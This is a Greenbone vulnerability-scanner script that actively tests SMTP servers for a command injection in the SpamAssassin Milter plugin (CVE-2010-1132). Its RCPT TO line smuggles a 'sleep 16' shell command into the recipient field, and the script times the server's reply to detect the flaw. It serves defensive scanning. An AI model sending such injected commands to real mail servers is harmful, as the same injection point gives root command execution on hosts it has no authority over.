# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100528");
  script_version("2023-10-31T05:06:37+0000");
  script_tag(name:"last_modification", value:"2023-10-31 05:06:37 +0000 (Tue, 31 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-03-15 13:03:19 +0100 (Mon, 15 Mar 2010)");
  script_cve_id("CVE-2010-1132");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("SMTP problems");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("smtpserver_detect.nasl", "check_smtp_helo.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("smtp/banner/available");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38578");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2010/Mar/140");

  script_tag(name:"summary", value:"SpamAssassin Milter Plugin is prone to a remote command
  injection vulnerability because it fails to adequately sanitize user-supplied input data.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted SMTP commands including a 'sleep 16'
  and tries to determine if the answer of the service is delayed for these 16 seconds.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to execute arbitrary
  shell commands with root privileges.");

  script_tag(name:"affected", value:"SpamAssassin Milter Plugin 0.3.1 is known to be affected.

  Other versions or products may also be vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

# nb: smtp_get_ports() instead of smtp_get_port() has been used to test each port sequentially and
# to not report the same flaw on e.g. port 25 and 465 at the same time.
ports = smtp_get_ports();

# nb: Kept outside of the loop to do the initial fork on multiple hostnames out of it.
host = get_host_name();

foreach port(ports) {

  if(get_kb_item("smtp/" + port + "/qmail/detected"))
    continue;

  if(!banner = smtp_get_banner(port:port))
    continue;

  dom = eregmatch(pattern:"220 ([^ ]+)", string:banner);
  if(isnull(dom[1])) {
    domain = host;
  } else {
    domain = dom[1];
  }

  if(!soc = smtp_open(port:port, data:NULL))
    continue;

  vtstrings = get_vt_strings();
  src_name = this_host_name();
  FROM = string(vtstrings["lowercase"], "@", src_name);
  TO = string(vtstrings["lowercase"], "@", domain);

  req1 = strcat("HELO ", src_name, '\r\n');
  send(socket:soc, data:req1);
  # e.g.:
  # 250 <targethostname>
  buf = smtp_recv_line(socket:soc, code:"250");
  if(!buf) {
    smtp_close(socket:soc, check_data:buf);
    continue;
  }

  start1 = unixtime();
  req2 = strcat("MAIL FROM: ", FROM, '\r\n');
  send(socket:soc, data:req2);
  # e.g.:
  # 250 2.1.0 Ok
  buf = smtp_recv_line(socket:soc, code:"250");
  if(!buf) {
    smtp_close(socket:soc, check_data:buf);
    continue;
  }

  stop1 = unixtime();
  dur1 = stop1 - start1;
  delay = dur1; # nb: Used for the second check below

  start2 = unixtime();
  req3 = string('RCPT TO: root+:"; sleep 16 ;"\r\n');
  send(socket:soc, data:req3);
  buf = smtp_recv_line(socket:soc);
  stop2 = unixtime();
  dur2 = stop2 - start2;

  smtp_close(socket:soc, check_data:buf);

  # e.g.:
  # 250 2.1.5 Ok
  if(!buf || buf !~ "^250[ -]")
    continue;

  if((dur2 > dur1 && dur2 > 15 && dur2 < 20) ||
     (dur2 > dur1 && dur2 > (15 + delay) && dur2 < (20 + delay))
    ) {
    report = "By sending the following SMTP command sequences using a 'sleep 16' it was determined that the system is answering with a delay of 16 seconds to the final request in comparison to the previous used commands:";
    report += '\n\n' + req1 + req2 + req3;
    security_message(port:port, data:chomp(report));
    exit(0);
  }
}

exit(99);
